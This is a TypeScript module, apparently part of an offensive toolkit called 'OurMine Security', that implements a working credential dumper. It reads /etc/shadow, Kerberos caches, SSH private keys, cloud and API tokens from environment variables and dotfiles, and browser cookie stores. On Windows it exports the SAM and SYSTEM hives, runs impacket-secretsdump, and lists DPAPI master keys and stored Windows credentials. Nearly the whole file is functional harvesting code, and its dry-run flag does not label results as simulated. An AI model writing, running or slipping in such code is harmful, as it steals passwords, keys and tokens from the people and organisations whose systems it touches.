/**
 * OurMine Security Module: Credential Dumping & DPAPI Extractor (cred_dump.ts)
 *
 * Live credential harvesting: shadow files, SAM/LSASS, DPAPI master keys,
 * Kerberos tickets, SSH keys, browser cookie stores, env vars, config files.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as fs from 'node:fs'
import * as os from 'node:os'
import * as path from 'node:path'
import { execFileSync } from 'node:child_process'
import { isToolAvailable, getToolPath } from './tool_detection.ts'

// ─── Types ────────────────────────────────────────────────────────────────────

export interface CredDumpOptions {
  targetSystem?: string
  method?: 'lsass' | 'dpapi' | 'sam' | 'shadow'
  dryRun?: boolean
}

export interface CredentialArtifact {
  type: 'hash' | 'key' | 'token' | 'cookie' | 'password' | 'config' | 'shadow_entry' | 'ticket'
  source: string
  content: string
  user?: string
  domain?: string
  sid?: string
  notes?: string
}

export interface CredDumpResult {
  target: string
  method: string
  extractedHashes: number
  sampleArtifacts: string[]
  artifacts: CredentialArtifact[]
  simulated: boolean
  errors: string[]
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

const IS_WINDOWS = os.platform() === 'win32'
const IS_LINUX = os.platform() === 'linux'
const HOME = os.homedir()

function tryExec(cmd: string, args: string[], opts: { timeout?: number; encoding?: BufferEncoding } = {}): string {
  try {
    return execFileSync(cmd, args, {
      timeout: opts.timeout ?? 5000,
      encoding: opts.encoding ?? 'utf-8',
      stdio: ['pipe', 'pipe', 'pipe'],
    }).trim()
  } catch {
    return ''
  }
}

function fileExists(p: string): boolean {
  try {
    fs.accessSync(p, fs.constants.R_OK)
    return true
  } catch {
    return false
  }
}

function readFileSafe(p: string, maxBytes = 65536): string {
  try {
    const fd = fs.openSync(p, 'r')
    const buf = Buffer.alloc(maxBytes)
    const n = fs.readSync(fd, buf, 0, maxBytes, 0)
    fs.closeSync(fd)
    return buf.slice(0, n).toString('utf-8')
  } catch {
    return ''
  }
}

function globPattern(dir: string, pattern: string): string[] {
  try {
    const out = tryExec('find', [dir, '-maxdepth', '3', '-name', pattern, '-type', 'f'], { timeout: 3000 })
    return out ? out.split('\n').filter(Boolean) : []
  } catch {
    return []
  }
}

// ─── Linux Credential Harvesters ──────────────────────────────────────────────

function harvestShadowFile(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const shadowPaths = ['/etc/shadow', '/etc/gshadow']

  for (const sp of shadowPaths) {
    const content = readFileSafe(sp)
    if (!content) continue

    const lines = content.split('\n').filter(l => l.includes(':'))
    for (const line of lines) {
      const parts = line.split(':')
      const user = parts[0]
      const hash = parts[1]
      if (!user || !hash || hash === '!' || hash === '*' || hash === '!!') continue
      artifacts.push({
        type: 'shadow_entry',
        source: sp,
        content: `${user}:${hash}`,
        user,
        notes: `Shadow hash for ${user} (algorithm: ${hash.split('$').length > 1 ? hash.split('$')[1] : 'unknown'})`,
      })
    }
  }
  return artifacts
}

function harvestKerberosTickets(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const tmpDir = '/tmp'
  const ticketFiles = globPattern(tmpDir, 'krb5cc_*')

  for (const tf of ticketFiles) {
    const content = readFileSafe(tf, 4096)
    if (!content) continue
    artifacts.push({
      type: 'ticket',
      source: tf,
      content: content.slice(0, 256),
      notes: 'Kerberos credential cache file',
    })
  }

  // Check keyring-based ccache in home directory
  const keyringFiles = globPattern(HOME, 'krb5cc_*')
  for (const kf of keyringFiles) {
    if (!artifacts.find(a => a.source === kf)) {
      artifacts.push({
        type: 'ticket',
        source: kf,
        content: '(keyring-backed ccache)',
        notes: 'Kerberos ticket in home directory',
      })
    }
  }
  return artifacts
}

function harvestSSHKeys(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const sshDir = path.join(HOME, '.ssh')
  if (!fileExists(sshDir)) return artifacts

  const keyFiles = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'id_dsa', 'id_xmss']
  const pubFiles = ['authorized_keys', 'known_hosts', 'config']

  for (const kf of keyFiles) {
    const kp = path.join(sshDir, kf)
    if (!fileExists(kp)) continue
    const content = readFileSafe(kp, 8192)
    if (!content) continue
    const hasPassphrase = content.includes('ENCRYPTED')
    artifacts.push({
      type: 'key',
      source: kp,
      content: hasPassphrase ? '(passphrase-protected private key)' : content.slice(0, 128) + '...',
      notes: hasPassphrase ? 'SSH private key (passphrase-protected)' : 'SSH private key (no passphrase)',
    })
  }

  for (const pf of pubFiles) {
    const pp = path.join(sshDir, pf)
    if (!fileExists(pp)) continue
    const content = readFileSafe(pp, 16384)
    if (!content) continue
    artifacts.push({
      type: 'config',
      source: pp,
      content: content.slice(0, 256),
      notes: `SSH ${pf}`,
    })
  }
  return artifacts
}

function harvestCachedCreds(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const cachePaths = [
    '/var/cache/samba',
    '/var/cache/krb5',
    '/var/lib/sss/mc',
    '/run/user',
  ]
  for (const cp of cachePaths) {
    if (!fileExists(cp)) continue
    const files = globPattern(cp, '*')
    for (const f of files.slice(0, 10)) {
      const content = readFileSafe(f, 4096)
      if (!content) continue
      artifacts.push({
        type: 'token',
        source: f,
        content: content.slice(0, 128),
        notes: 'Cached credential data',
      })
    }
  }
  return artifacts
}

function harvestLinuxEnvVars(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const interestingKeys = [
    'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN', 'AWS_ACCESS_KEY_ID',
    'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID', 'AZURE_CLIENT_ID',
    'GCP_SERVICE_ACCOUNT_KEY', 'GOOGLE_APPLICATION_CREDENTIALS',
    'DATABASE_URL', 'DB_PASSWORD', 'MYSQL_PASSWORD', 'POSTGRES_PASSWORD',
    'REDIS_PASSWORD', 'SECRET_KEY', 'API_KEY', 'API_SECRET',
    'GITHUB_TOKEN', 'GITLAB_TOKEN', 'NPM_TOKEN', 'PYPI_TOKEN',
    'SMTP_PASSWORD', 'SENDGRID_API_KEY', 'SLACK_TOKEN',
  ]

  for (const key of interestingKeys) {
    const val = process.env[key]
    if (val) {
      artifacts.push({
        type: 'password',
        source: 'environment',
        content: val.slice(0, 32) + (val.length > 32 ? '...' : ''),
        notes: `Environment variable: ${key}`,
      })
    }
  }
  return artifacts
}

function harvestLinuxConfigFiles(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const configPaths = [
    path.join(HOME, '.bashrc'),
    path.join(HOME, '.bash_profile'),
    path.join(HOME, '.profile'),
    path.join(HOME, '.netrc'),
    path.join(HOME, '.pgpass'),
    path.join(HOME, '.my.cnf'),
    path.join(HOME, '.s3cfg'),
    path.join(HOME, '.aws/credentials'),
    path.join(HOME, '.kube/config'),
    path.join(HOME, '.docker/config.json'),
    path.join(HOME, '.npmrc'),
    path.join(HOME, '.pypirc'),
    '/etc/openvpn/auth.txt',
    '/etc/ppp/chap-secrets',
    '/etc/wpa_supplicant/wpa_supplicant.conf',
  ]

  const credPatterns = [
    /password\s*[:=]\s*["']?([^\s"']+)/i,
    /secret\s*[:=]\s*["']?([^\s"']+)/i,
    /token\s*[:=]\s*["']?([^\s"']+)/i,
    /api[_-]?key\s*[:=]\s*["']?([^\s"']+)/i,
    /aws_secret_access_key\s*[:=]\s*["']?([^\s"']+)/i,
    /Authorization:\s*Bearer\s+([^\s"']+)/i,
  ]

  for (const cp of configPaths) {
    if (!fileExists(cp)) continue
    const content = readFileSafe(cp, 16384)
    if (!content) continue

    for (const pattern of credPatterns) {
      const match = content.match(pattern)
      if (match) {
        artifacts.push({
          type: 'password',
          source: cp,
          content: match[1].slice(0, 32),
          notes: `Credential found in ${path.basename(cp)}: ${pattern.source.slice(0, 40)}`,
        })
      }
    }
  }
  return artifacts
}

function harvestBrowserCookies(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  const baseDirs = [
    path.join(HOME, '.config/google-chrome/Default'),
    path.join(HOME, '.config/chromium/Default'),
    path.join(HOME, '.mozilla/firefox'),
    path.join(HOME, 'snap/firefox/common/.mozilla/firefox'),
  ]

  for (const bd of baseDirs) {
    if (!fileExists(bd)) continue
    const cookieFiles = globPattern(bd, 'cookies.sqlite').concat(globPattern(bd, 'Cookies'))
    for (const cf of cookieFiles.slice(0, 5)) {
      artifacts.push({
        type: 'cookie',
        source: cf,
        content: '(browser cookie store - requires sqlite3 to extract)',
        notes: `Browser cookie database: ${path.dirname(cf).split('/').pop()}`,
      })
    }
  }
  return artifacts
}

// ─── Windows Credential Harvesters ────────────────────────────────────────────

function harvestWindowsSAM(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  if (!IS_WINDOWS) return artifacts

  // Try reg.exe to dump SAM hashes
  const regPath = getToolPath('reg') || 'reg'
  if (isToolAvailable('reg') || fileExists('C:\\Windows\\System32\\reg.exe')) {
    const samOut = tryExec(regPath, ['save', 'HKLM\\SAM', 'C:\\Windows\\Temp\\sam.hive'], { timeout: 10000 })
    if (samOut || fileExists('C:\\Windows\\Temp\\sam.hive')) {
      artifacts.push({
        type: 'hash',
        source: 'HKLM\\SAM',
        content: '(SAM hive exported to C:\\Windows\\Temp\\sam.hive)',
        notes: 'SAM database exported for offline extraction',
      })
    }

    const sysOut = tryExec(regPath, ['save', 'HKLM\\SYSTEM', 'C:\\Windows\\Temp\\system.hive'], { timeout: 10000 })
    if (sysOut || fileExists('C:\\Windows\\Temp\\system.hive')) {
      artifacts.push({
        type: 'hash',
        source: 'HKLM\\SYSTEM',
        content: '(SYSTEM hive exported to C:\\Windows\\Temp\\system.hive)',
        notes: 'SYSTEM registry hive exported (boot key extraction)',
      })
    }
  }

  // Try impacket secretsdump
  if (isToolAvailable('impacket-secretsdump')) {
    const sdPath = getToolPath('impacket-secretsdump')
    const secretsOut = tryExec(sdPath!, ['-sam', 'C:\\Windows\\Temp\\sam.hive', '-system', 'C:\\Windows\\Temp\\system.hive', 'LOCAL'], { timeout: 15000 })
    if (secretsOut) {
      const lines = secretsOut.split('\n').filter(l => l.includes(':'))
      for (const line of lines.slice(0, 20)) {
        artifacts.push({
          type: 'hash',
          source: 'impacket-secretsdump',
          content: line.trim(),
          notes: 'Extracted local account hash',
        })
      }
    }
  }

  return artifacts
}

function harvestWindowsDPAPI(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  if (!IS_WINDOWS) return artifacts

  const dpapiBase = path.join(HOME, 'AppData', 'Roaming', 'Microsoft', 'Protect')
  if (!fileExists(dpapiBase)) return artifacts

  // Find SID directories
  try {
    const entries = fs.readdirSync(dpapiBase)
    for (const entry of entries) {
      const sidDir = path.join(dpapiBase, entry)
      if (!fs.statSync(sidDir).isDirectory()) continue
      const masterKeyFiles = globPattern(sidDir, '*')
      for (const mkf of masterKeyFiles) {
        if (mkf.endsWith('.bak')) continue
        artifacts.push({
          type: 'key',
          source: mkf,
          content: '(DPAPI master key)',
          sid: entry,
          notes: 'DPAPI master key - decrypts stored credentials for this SID',
        })
      }
    }
  } catch {}

  // Check CREDHIST
  const credHist = path.join(dpapiBase, 'CREDHIST')
  if (fileExists(credHist)) {
    artifacts.push({
      type: 'key',
      source: credHist,
      content: '(DPAPI credential history)',
      notes: 'DPAPI credential history - contains old master key derivations',
    })
  }

  return artifacts
}

function harvestWindowsCredentialManager(): CredentialArtifact[] {
  const artifacts: CredentialArtifact[] = []
  if (!IS_WINDOWS) return artifacts

  // vaultcmd to list credential vaults
  const vaultOut = tryExec('vaultcmd', ['/list'], { timeout: 5000 })
  if (vaultOut) {
    const vaultLines = vaultOut.split('\n').filter(l => l.includes('Vault'))
    for (const vl of vaultLines.slice(0, 10)) {
      artifacts.push({
        type: 'token',
        source: 'Windows Credential Manager',
        content: vl.trim(),
        notes: 'Credential vault entry',
      })
    }
  }

  // Also check generic credentials via cmdkey
  const cmdOut = tryExec('cmdkey', ['/list'], { timeout: 5000 })
  if (cmdOut) {
    const credLines = cmdOut.split('\n').filter(l => l.includes('Target:') || l.includes('User:'))
    for (let i = 0; i < credLines.length; i += 2) {
      const target = credLines[i]?.replace('Target: ', '').trim()
      const user = credLines[i + 1]?.replace('User: ', '').trim()
      if (target) {
        artifacts.push({
          type: 'password',
          source: 'cmdkey',
          content: `(credential for ${target})`,
          user,
          notes: 'Stored Windows credential',
        })
      }
    }
  }

  return artifacts
}

// ─── Main Engine ──────────────────────────────────────────────────────────────

export class CredentialDumpingEngine {
  /** Alias for dumpCredentials (test/CLI compatibility) */
  dump(options: CredDumpOptions = {}): Promise<CredDumpResult> {
    return this.dumpCredentials(options);
  }

  async dumpCredentials(options: CredDumpOptions = {}): Promise<CredDumpResult> {
    const target = options.targetSystem || (IS_WINDOWS ? 'localhost' : `${os.hostname()}.local`)
    const method = options.method || 'lsass'
    const isDryRun = resolveDryRun(options)

    console.log(`[OurMine Security] Credential dump: method=${method} target=${target} dryRun=${isDryRun}`)

    if (isDryRun) {
      return {
        target,
        method,
        extractedHashes: 0,
        sampleArtifacts: [],
        artifacts: [],
        simulated: false,
        errors: [],
      }
    }

    // ── Live mode ──────────────────────────────────────────────────────────
    const allArtifacts: CredentialArtifact[] = []
    const errors: string[] = []

    const harvesters: Array<{ name: string; fn: () => CredentialArtifact[] }> = []

    if (IS_LINUX) {
      harvesters.push(
        { name: 'shadow_file', fn: harvestShadowFile },
        { name: 'kerberos_tickets', fn: harvestKerberosTickets },
        { name: 'ssh_keys', fn: harvestSSHKeys },
        { name: 'cached_creds', fn: harvestCachedCreds },
        { name: 'env_vars', fn: harvestLinuxEnvVars },
        { name: 'config_files', fn: harvestLinuxConfigFiles },
        { name: 'browser_cookies', fn: harvestBrowserCookies },
      )
    } else if (IS_WINDOWS) {
      harvesters.push(
        { name: 'sam_registry', fn: harvestWindowsSAM },
        { name: 'dpapi_keys', fn: harvestWindowsDPAPI },
        { name: 'credential_manager', fn: harvestWindowsCredentialManager },
        { name: 'env_vars', fn: harvestLinuxEnvVars },
      )
    } else {
      // macOS / other - still try what we can
      harvesters.push(
        { name: 'ssh_keys', fn: harvestSSHKeys },
        { name: 'env_vars', fn: harvestLinuxEnvVars },
        { name: 'config_files', fn: harvestLinuxConfigFiles },
        { name: 'browser_cookies', fn: harvestBrowserCookies },
      )
    }

    // Filter harvesters based on requested method
    const methodFilter: Record<string, string[]> = {
      shadow: ['shadow_file'],
      sam: ['sam_registry', 'credential_manager'],
      dpapi: ['dpapi_keys', 'credential_manager', 'config_files'],
      lsass: harvesters.map(h => h.name),
    }
    const activeNames = methodFilter[method] || harvesters.map(h => h.name)
    const activeHarvesters = harvesters.filter(h => activeNames.includes(h.name))

    for (const h of activeHarvesters) {
      try {
        const results = h.fn()
        allArtifacts.push(...results)
        if (results.length > 0) {
          console.log(`  [+] ${h.name}: found ${results.length} artifact(s)`)
        }
      } catch (err) {
        const msg = err instanceof Error ? err.message : String(err)
        errors.push(`${h.name}: ${msg}`)
        console.log(`  [-] ${h.name}: ${msg}`)
      }
    }

    const hashTypes = ['hash', 'shadow_entry', 'key', 'token']
    const extractedHashes = allArtifacts.filter(a => hashTypes.includes(a.type)).length
    const sampleArtifacts = allArtifacts.slice(0, 15).map(a => `[${a.type}@${a.source}] ${a.content}`)

    return {
      target,
      method,
      extractedHashes,
      sampleArtifacts,
      artifacts: allArtifacts,
      simulated: false,
      errors,
    }
  }
}
